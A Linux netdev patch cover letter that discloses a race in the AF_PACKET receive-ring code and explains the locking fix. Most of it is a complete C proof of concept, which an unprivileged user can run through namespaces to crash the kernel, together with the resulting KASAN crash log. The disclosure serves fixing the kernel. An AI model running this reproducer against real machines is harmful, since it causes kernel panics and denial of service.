Received: from mail-pl1-f180.google.com (mail-pl1-f180.google.com [209.85.214.180])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E36F53B7B76
	for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 09:17:20 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.180
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785316643; cv=none; b=vBubQR5nFR05JsYL9oitPbP+LvE56u1WvZ1YbUymvkJm+lWqXGLjCzxv3911Px0EvSdJ30HKAqmbekH8X6U6AIAN0LDGV0FtXw7HjJ6JSkQI4Cxxw8bbYhYeKJmwzucDiJhW4vUR1czOVhXWlkPKI1HN4zIGiEcirsoiCaPjCGU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785316643; c=relaxed/simple;
	bh=2/T9D5Ljfrb8DtytGyWPxBoId0G+4UNZ1+N9cWc7/yI=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=GcLjGg0zSxucx95MrB+1BKJ2VD8J8wvZik9WvtuuO/mI82ugww7m3YOBW+NROo9SrcXENmB8M8u6FdpDIemzfCQtYnFSRWpVL5VcKvbj0e8va9OZ58Dt1DIEiYqnXyGiJUS2qgZIyvwvFGdsC4bZGs85mnehV+qAScUwCCZSS8c=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=srrzRElc; arc=none smtp.client-ip=209.85.214.180
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="srrzRElc"
Received: by mail-pl1-f180.google.com with SMTP id d9443c01a7336-2cacb8416a1so7833485ad.1
        for <netdev@vger.kernel.org>; Wed, 29 Jul 2026 02:17:20 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785316639; x=1785921439; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=vPWlxsxjcD16txmnv59+cx24A6JITEKSIjXiDK1hhw8=;
        b=srrzRElch53sQRv11z49141FpklwugtpVu/+DjsD8W0rPz5OwBwaSkc61WxKQBNThC
         32cY/NPUJ1CrvpDoJo8DonrILi7NLSZgpfNd+31p4fLshRkO7C4VD1SZkRxrO/+radhP
         FsOkviUwJjs+5UYM3Ic4+M2wqYXCa9rP5Jt6hGoxGL5y9da43JylVux9V1jsOshipMh7
         qCTcISdTkVTvfNjRFE1arti4RGUFU3YBPd5XABYevX0dfOLO+wxu3BQpvrqGdR78Wiev
         kxireiYoepOaDhZQaZojfdW9ViHukfVuLvnVjvl8ygUF/auwOWGigQZFA4WfmOA+xt1A
         Gk3A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785316639; x=1785921439;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=vPWlxsxjcD16txmnv59+cx24A6JITEKSIjXiDK1hhw8=;
        b=ntU1T7T8ocr9Jzz0YbbJah2JXV9f7MA3kDGgsJjjkKxe+6F85pz59l+XZfb9jSdDCI
         xL8mtAp9dj8fcjII+ggCSq7W5AQuKMp9mrk1LcVkwlo/4lfr8lQBz0YuwjTI8qe8QfaT
         +GUXtt3VglICiHRBpeeyJbb31frdUm65Pye7Ojujl/gC0zbDK4E2H1iJZtqw3+1DPT+8
         KqZhd7WJcFpZHFhiKLSPHKsgY0HbSx4YgLsyzQJAZFoufh1VZhsLKMRRvVO7vZn4SKvj
         GZ44LaST9vFBo8aq265wmaJLdxEXaPq7aI2DiwMC6GV8hfKjic+gtb1OSBrNrtLPfyAM
         5W8g==
X-Gm-Message-State: AOJu0YzLkNrXsMTowFo1wDYURiwWUxRNmKosD8/wvWkgD9FOsViAH7KX
	ejNLFJJfQDSCxVhJOLBPHumKAYI3AiDIPf7NqU6GzHoqWl1JHP4ir6/GNueOvtuOs0UDN45EwRO
	gGo1spmKQU9BiFg==
X-Gm-Gg: AR+sD10PZpRU5gSLiWP5nHUknnQiS+wLpCx8WE/2GENprZzXnSa7Zm4bZdkyuG8aAsh
	+eGvhGa7PNxFljjostTT5HaO9m07tC5+y6TiQqlg+VFQ9kpTjn6ne7Q+KlwLsni2VeeKA/s1dCo
	0NSmt0ia5qTi/uzlxXCnhbKNKrqqQLlwjMdhv73jzg+zAmmHxB240xyH+VWjhw3qt7GWH16s97k
	ocuoGOliwCVr5HjKx47WiEjEh3PTbBXde1yRY6DpDrh9ob3jgst2fD1Hp02DN3oQTPl2LI3T35U
	I7uqDfNrQ1v8BXWqTy9hhPObF71JKWxl31IUFMrjUumBdF7F5WOi8d0Mz19jW7r0RoFrhPJigvd
	vrlClyd5FHyfVl5iY8hRJ05C4TqAKcEwxpjn6XPXw4+iQVaMTnVUWVsS/ua5y9UkDABNrsOCQ7U
	wY/4c6l3gIHYTaU4qQROEKjSKXCbVs4eCaVvBEsVK27+TTSY3XMUoC2Ren+AwsXT0T7SV+OQ4C
X-Received: by 2002:a17:903:2f0d:b0:2cf:b68a:340 with SMTP id d9443c01a7336-2d015abe547mr70173195ad.10.1785316639117;
        Wed, 29 Jul 2026 02:17:19 -0700 (PDT)
Received: from localhost.localdomain ([115.192.250.185])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d022a15885sm8390685ad.15.2026.07.29.02.17.16
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 29 Jul 2026 02:17:18 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net v3 0/1] packet: fix stale ring mode race
Date: Wed, 29 Jul 2026 09:16:52 +0000
Message-ID: <cover.1785247446.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/packet/af_packet.c. The bug is
reachable by a non-root user via user and net namespace, with
CAP_NET_RAW in the target network namespace, through PACKET_RX_RING
reconfiguration on an AF_PACKET socket.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

packet_set_ring() swaps or clears po->rx_ring.pg_vec and related RX ring
state while holding sk->sk_receive_queue.lock. Before this patch, it
published the receive mode by updating po->prot_hook.func only after
dropping that queue lock.

packet_poll() and packet_recvmsg() may call
packet_rcv_try_clear_pressure(), which reaches
__packet_rcv_has_room(). That helper decides whether to use the
tpacket ring helpers solely from po->prot_hook.func. A concurrent poll
or recvmsg path can therefore observe a stale tpacket_rcv value after
the RX ring has already been cleared. For TPACKET_V1/V2 this can drive
packet_lookup_frame() with rb->pg_vec == NULL; for TPACKET_V3, stale
block queue metadata may be used after the old ring is released.

Fix this by moving the existing receive hook assignment into the same
sk_receive_queue.lock section as the ring state update. The assignment
is otherwise unchanged, including on TX ring reconfiguration, to avoid
adding behavior changes that are not required for the fix.

packet_recvmsg() only takes the queue lock after observing
PACKET_SOCK_PRESSURE. If the flag is clear and the socket has moved
away from tpacket_rcv, packet_set_ring() has already detached the
socket and waited for synchronize_net(), so no new packet input can set
the flag again. packet_poll() already holds sk_receive_queue.lock, so it
uses the unlocked helper directly.

The pressure-clearing trigger used by this reproducer was introduced
by commit 2ccdbaa6d55b ("packet: rollover lock contention avoidance"),
which added owner-side pressure clearing from packet_recvmsg() and
packet_poll(). Therefore the Fixes tag points to 2ccdbaa6d55b.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

static volatile sig_atomic_t stop_flag;
static size_t ring_block_size;
static size_t ring_frame_size;
static size_t send_len = 2048;

static void die(const char *what)
{
	perror(what);
	exit(1);
}

static long gettid_wrap(void)
{
	return syscall(SYS_gettid);
}

static void pin_to_cpu(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	if (sched_setaffinity(0, sizeof(set), &set) != 0)
		perror("sched_setaffinity");
}

static void set_nonblock(int fd)
{
	int flags = fcntl(fd, F_GETFL, 0);

	if (flags < 0)
		die("fcntl(F_GETFL)");
	if (fcntl(fd, F_SETFL, flags | O_NONBLOCK) != 0)
		die("fcntl(F_SETFL)");
}

static int make_packet_socket(int ifindex, int fanout_arg, bool with_ring)
{
	int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
	int version = TPACKET_V1;
	int copy_thresh = 1;
	struct sockaddr_ll sll = {
		.sll_family = AF_PACKET,
		.sll_protocol = htons(ETH_P_IP),
		.sll_ifindex = ifindex,
	};

	if (fd < 0)
		die("socket(AF_PACKET)");
	set_nonblock(fd);

	if (setsockopt(fd, SOL_PACKET, PACKET_VERSION, &version,
		       sizeof(version)) != 0)
		die("setsockopt(PACKET_VERSION)");
	if (setsockopt(fd, SOL_PACKET, PACKET_COPY_THRESH, &copy_thresh,
		       sizeof(copy_thresh)) != 0)
		die("setsockopt(PACKET_COPY_THRESH)");

	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) != 0)
		die("bind(AF_PACKET)");

	if (setsockopt(fd, SOL_PACKET, PACKET_FANOUT, &fanout_arg,
		       sizeof(fanout_arg)) != 0)
		die("setsockopt(PACKET_FANOUT)");

	if (with_ring) {
		struct tpacket_req req = {
			.tp_block_size = ring_block_size,
			.tp_block_nr = 1,
			.tp_frame_size = ring_frame_size,
			.tp_frame_nr = ring_block_size / ring_frame_size,
		};

		if (setsockopt(fd, SOL_PACKET, PACKET_RX_RING, &req,
			       sizeof(req)) != 0)
			die("setsockopt(PACKET_RX_RING create)");
	}

	return fd;
}

static void destroy_ring(int fd)
{
	struct tpacket_req req = {0};

	if (setsockopt(fd, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req)) != 0)
		die("setsockopt(PACKET_RX_RING destroy)");
}

static void create_ring(int fd)
{
	struct tpacket_req req = {
		.tp_block_size = ring_block_size,
		.tp_block_nr = 1,
		.tp_frame_size = ring_frame_size,
		.tp_frame_nr = ring_block_size / ring_frame_size,
	};

	if (setsockopt(fd, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req)) != 0)
		die("setsockopt(PACKET_RX_RING recreate)");
}

static int make_udp_pair(void)
{
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_port = htons(31337),
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
	};
	int one = 1;

	if (fd < 0)
		die("socket(AF_INET)");
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) != 0)
		die("setsockopt(SO_REUSEADDR)");
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) != 0)
		die("bind(AF_INET)");
	set_nonblock(fd);
	return fd;
}

struct thread_args {
	int target_fd;
	int mirror_fd;
	int sink_fd;
};

static void *poll_thread(void *arg)
{
	struct thread_args *args = arg;
	struct pollfd pfd = {
		.fd = args->target_fd,
		.events = POLLIN | POLLERR,
	};

	pin_to_cpu(0);
	printf("[*] poll thread tid=%ld\n", gettid_wrap());
	fflush(stdout);

	while (!stop_flag) {
		(void)poll(&pfd, 1, 0);
	}

	return NULL;
}

static void *recv_thread(void *arg)
{
	struct thread_args *args = arg;
	char buf[65536];
	unsigned long iters = 0;

	pin_to_cpu(1);
	printf("[*] recv thread tid=%ld\n", gettid_wrap());
	fflush(stdout);

	while (!stop_flag) {
		ssize_t n = recv(args->target_fd, buf, sizeof(buf), 0);

		if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK &&
		    errno != EINTR)
			die("recv(packet target)");
		if ((++iters & 0xfffffUL) == 0) {
			printf("[*] recv iterations=%lu\n", iters);
			fflush(stdout);
		}
	}

	return NULL;
}

static void *reconfig_thread(void *arg)
{
	struct thread_args *args = arg;
	unsigned long iters = 0;

	pin_to_cpu(1);
	printf("[*] reconfig thread tid=%ld\n", gettid_wrap());
	fflush(stdout);

	while (!stop_flag) {
		destroy_ring(args->target_fd);
		create_ring(args->target_fd);
		if ((++iters & 0xfffffUL) == 0) {
			printf("[*] reconfig iterations=%lu\n", iters);
			fflush(stdout);
		}
	}

	return NULL;
}

static void *udp_sink_thread(void *arg)
{
	struct thread_args *args = arg;
	char buf[65536];

	pin_to_cpu(2);
	printf("[*] sink thread tid=%ld\n", gettid_wrap());
	fflush(stdout);

	while (!stop_flag) {
		ssize_t n = recv(args->sink_fd, buf, sizeof(buf), 0);

		if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK &&
		    errno != EINTR)
			die("recv(udp sink)");
	}

	return NULL;
}

static void *udp_sender_thread(void *arg)
{
	struct thread_args *args = arg;

	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	struct sockaddr_in addr = {
		.sin_family = AF_INET,
		.sin_port = htons(31337),
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
	};
	char *buf;
	unsigned long iters = 0;

	if (fd < 0)
		die("socket(AF_INET sender)");
	buf = malloc(send_len);
	if (!buf)
		die("malloc(send buffer)");

	pin_to_cpu(3);
	memset(buf, 'A', send_len);
	printf("[*] sender thread tid=%ld\n", gettid_wrap());
	fflush(stdout);

	while (!stop_flag) {
		char drain[65536];
		ssize_t n = sendto(fd, buf, send_len, 0,
				   (struct sockaddr *)&addr, sizeof(addr));

		if (n < 0 && errno != EINTR)
			die("sendto(loopback)");
		for (;;) {
			n = recv(args->sink_fd, drain, sizeof(drain), 0);
			if (n < 0) {
				if (errno == EAGAIN || errno == EWOULDBLOCK ||
				    errno == EINTR)
					break;
				die("recv(loopback sink)");
			}
		}
		if ((++iters & 0xfffffUL) == 0) {
			printf("[*] send iterations=%lu\n", iters);
			fflush(stdout);
		}
	}

	close(fd);
	return NULL;
}

int main(void)
{
	const int ifindex = if_nametoindex("lo");
	const int fanout_id = 0x2345;
	const int fanout_arg = fanout_id |
		((PACKET_FANOUT_LB | PACKET_FANOUT_FLAG_ROLLOVER) << 16);
	struct thread_args args;
	pthread_t poller;
	pthread_t receiver;
	pthread_t reconfig;
	pthread_t sender;

	ring_block_size = getpagesize();
	ring_frame_size = 128;

	if (!ifindex) {
		errno = ENODEV;
		die("if_nametoindex(lo)");
	}

	printf("[*] lo ifindex=%d\n", ifindex);
	fflush(stdout);

	args.sink_fd = make_udp_pair();
	args.target_fd = make_packet_socket(ifindex, fanout_arg, true);
	args.mirror_fd = make_packet_socket(ifindex, fanout_arg, false);

	printf("[*] target packet fd=%d\n", args.target_fd);
	printf("[*] mirror packet fd=%d\n", args.mirror_fd);
	printf("[*] fanout arg=0x%x\n", fanout_arg);
	printf("[*] ring: block=%zu frame=%zu frames=%zu send_len=%zu\n",
	       ring_block_size, ring_frame_size,
	       ring_block_size / ring_frame_size, send_len);
	fflush(stdout);

	if (pthread_create(&sender, NULL, udp_sender_thread, &args) != 0)
		die("pthread_create(sender)");

	sleep(1);
	printf("[*] starting poll/reconfigure race\n");
	fflush(stdout);

	if (pthread_create(&receiver, NULL, recv_thread, &args) != 0)
		die("pthread_create(receiver)");
	if (pthread_create(&poller, NULL, poll_thread, &args) != 0)
		die("pthread_create(poller)");
	if (pthread_create(&reconfig, NULL, reconfig_thread, &args) != 0)
		die("pthread_create(reconfig)");

	for (;;)
		pause();

	return 0;
}

------END poc.c--------

----BEGIN crash log----

[ 1250.041340][T10008] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000000: 0000 [#1] SMP KASAN NOPTI
[ 1250.042310][T10008] KASAN: null-ptr-deref in range [0x0000000000000000-0x0000000000000007]
[ 1250.042864][T10008] CPU: 0 UID: 0 PID: 10008 Comm: poc Not tainted 7.1.0-rc1 #2 PREEMPT(full)
[ 1250.043451][T10008] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 1250.044145][T10008] RIP: 0010:packet_lookup_frame.isra.0+0x33/0x1c0
[ 1250.044597][T10008] Code: c0 55 89 cd 53 48 89 fb 48 89 f7 89 d6 31 d2 f7 f6 48 83 ec 10 4c 8d 24 c7 48 b8 00 00 00 00 00 fc ff df 4c 89 e1 48 c1 e9 03 <80> 3c 01 00 0f 85 30 01 00 00 89 d0 0f af c5 49 03 04 24 48 8d bb
[ 1250.045881][T10008] RSP: 0018:ffa000001366f7f8 EFLAGS: 00010256
[ 1250.046289][T10008] RAX: dffffc0000000000 RBX: ff11000070c74000 RCX: 0000000000000000
[ 1250.046801][T10008] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 0000000000000000
[ 1250.047319][T10008] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[ 1250.047830][T10008] R10: ff11000070c7489f R11: 000000000000083b R12: 0000000000000000
[ 1250.048347][T10008] R13: ff11000070c7459c R14: ff11000070c74590 R15: ff11000070c74588
[ 1250.048865][T10008] FS:  00007f395cc1e6c0(0000) GS:ff11000184acf000(0000) knlGS:0000000000000000
[ 1250.049451][T10008] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 1250.049878][T10008] CR2: 00007ffda7f5be2c CR3: 000000002307f000 CR4: 0000000000751ef0
[ 1250.050405][T10008] PKRU: 55555554
[ 1250.050642][T10008] Call Trace:
[ 1250.050860][T10008]  <TASK>
[ 1250.051069][T10008]  __packet_rcv_has_room+0x271/0x6b0
[ 1250.051415][T10008]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1250.051792][T10008]  ? __pfx_packet_poll+0x10/0x10
[ 1250.052124][T10008]  packet_rcv_try_clear_pressure+0x51/0x80
[ 1250.052508][T10008]  packet_poll+0x1b5/0x500
[ 1250.052803][T10008]  sock_poll+0x134/0x490
[ 1250.053115][T10008]  do_sys_poll+0x507/0xbf0
[ 1250.053424][T10008]  ? __pfx_do_sys_poll+0x10/0x10
[ 1250.053765][T10008]  ? __lock_acquire+0x45c/0x25f0
[ 1250.054140][T10008]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1250.054511][T10008]  ? do_raw_spin_lock+0x12d/0x270
[ 1250.054844][T10008]  ? __pfx_do_raw_spin_lock+0x10/0x10
[ 1250.055203][T10008]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1250.055570][T10008]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1250.055954][T10008]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1250.056325][T10008]  ? sched_clock_cpu+0x6c/0x530
[ 1250.056656][T10008]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1250.057030][T10008]  __x64_sys_poll+0x181/0x3e0
[ 1250.057337][T10008]  ? __pfx___x64_sys_poll+0x10/0x10
[ 1250.057679][T10008]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1250.058059][T10008]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 1250.058426][T10008]  ? rcu_is_watching+0x12/0xc0
[ 1250.058745][T10008]  do_syscall_64+0x116/0xf80
[ 1250.059069][T10008]  ? irqentry_exit+0x117/0x830
[ 1250.059392][T10008]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[ 1250.059779][T10008] RIP: 0033:0x7f395dcbe9ee
[ 1250.060081][T10008] Code: 08 0f 85 f5 4b ff ff 49 89 fb 48 89 f0 48 89 d7 48 89 ce 4c 89 c2 4d 89 ca 4c 8b 44 24 08 4c 8b 4c 24 10 4c 89 5c 24 08 0f 05 <c3> 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 80 00 00 00 00 48 83 ec 08
[ 1250.061315][T10008] RSP: 002b:00007f395cc1de18 EFLAGS: 00000246 ORIG_RAX: 0000000000000007
[ 1250.061858][T10008] RAX: ffffffffffffffda RBX: 00007f395cc1e6c0 RCX: 00007f395dcbe9ee
[ 1250.062379][T10008] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 00007f395cc1de80
[ 1250.062902][T10008] RBP: ffffffffffffff00 R08: 0000000000000000 R09: 0000000000000000
[ 1250.063427][T10008] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000021
[ 1250.063944][T10008] R13: 0000000000000000 R14: 00007fff4bd03900 R15: 00007f395c41e000
[ 1250.064494][T10008]  </TASK>
[ 1250.064693][T10008] Modules linked in:
[ 1250.065041][T10008] ---[ end trace 0000000000000000 ]---
[ 1250.065428][T10008] RIP: 0010:packet_lookup_frame.isra.0+0x33/0x1c0
[ 1250.065955][T10008] Code: c0 55 89 cd 53 48 89 fb 48 89 f7 89 d6 31 d2 f7 f6 48 83 ec 10 4c 8d 24 c7 48 b8 00 00 00 00 00 fc ff df 4c 89 e1 48 c1 e9 03 <80> 3c 01 00 0f 85 30 01 00 00 89 d0 0f af c5 49 03 04 24 48 8d bb
[ 1250.067510][T10008] RSP: 0018:ffa000001366f7f8 EFLAGS: 00010256
[ 1250.067935][T10008] RAX: dffffc0000000000 RBX: ff11000070c74000 RCX: 0000000000000000
[ 1250.068553][T10008] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 0000000000000000
[ 1250.069271][T10008] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
[ 1250.069879][T10008] R10: ff11000070c7489f R11: 000000000000083b R12: 0000000000000000
[ 1250.070540][T10008] R13: ff11000070c7459c R14: ff11000070c74590 R15: ff11000070c74588
[ 1250.071188][T10008] FS:  00007f395cc1e6c0(0000) GS:ff11000184acf000(0000) knlGS:0000000000000000
[ 1250.071991][T10008] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 1250.072518][T10008] CR2: 00007ffda7f5be2c CR3: 000000002307f000 CR4: 0000000000751ef0
[ 1250.073215][T10008] PKRU: 55555554
[ 1250.073492][T10008] Kernel panic - not syncing: Fatal exception in interrupt
[ 1250.074247][T10008] Kernel Offset: disabled
[ 1250.074781][T10008] Rebooting in 86400 seconds..

-----END crash log-----

The stack trace above is taken from the locally decoded crash log
prepared with scripts/decode_stacktrace.sh.

Best regards,
Zihan Xi

Zihan Xi (1):
  packet: synchronize pressure clearing with ring reconfiguration

 net/packet/af_packet.c | 20 ++++++++++++++++----
 1 file changed, 16 insertions(+), 4 deletions(-)


-- 
2.43.0
